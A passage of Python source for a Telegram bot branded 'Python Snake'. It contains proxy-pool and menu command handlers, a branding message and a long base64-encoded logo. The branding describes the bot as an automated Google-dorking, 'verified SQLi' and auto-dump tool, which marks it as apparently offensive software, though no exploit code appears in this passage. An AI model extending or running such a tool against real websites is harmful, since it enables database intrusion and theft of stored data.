        parse_mode=ParseMode.HTML)


async def _v22_proxyclear_cmd(update, context) -> None:
    if not is_admin(update.effective_user.id):
        await update.effective_message.reply_text("❌ Admin only.")
        return
    n = len(_V22_PROXY_POOL)
    _V22_PROXY_POOL.clear()
    _v22_proxy_save()
    await update.effective_message.reply_text("🧹 v22 proxy pool cleared (%s)." % n)


async def _v22_classic_cmd(update, context) -> None:
    _V22_SHOW_CLASSIC["on"] = not _V22_SHOW_CLASSIC["on"]
    await update.effective_message.reply_text(
        "🐍 Full (classic) menu: <b>%s</b>" % ("ON" if _V22_SHOW_CLASSIC["on"] else "OFF"),
        parse_mode=ParseMode.HTML, reply_markup=make_main_menu())


def _v22_brand_text() -> str:
    return ("🐍 <b>PYTHON SNAKE</b> 🐍\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Build: <code>%s</code>\n"
            "Engines: <code>%d</code> • Wayback/CC: ON\n"
            "Auto Dump • Universal Dorks • Verified SQLi\n\n"
            "BotFather → /setname → <b>Python Snake</b>\n"
            "BotFather → /setuserpic → yehi logo upload karo\n"
            "BotFather → /setdescription → 'Automated dorking, parsing & "
            "verified SQLi — all in one.'") % (_V12_VERSION_TAG, len(_V19_ENGINES))


async def _v22_brand_cmd(update, context) -> None:
    msg = update.effective_message
    txt = _v22_brand_text()
    if await _v22_send_logo(msg, txt):
        return
    await msg.reply_text(txt, parse_mode=ParseMode.HTML)


_V22_LOGO_B64 = (
    "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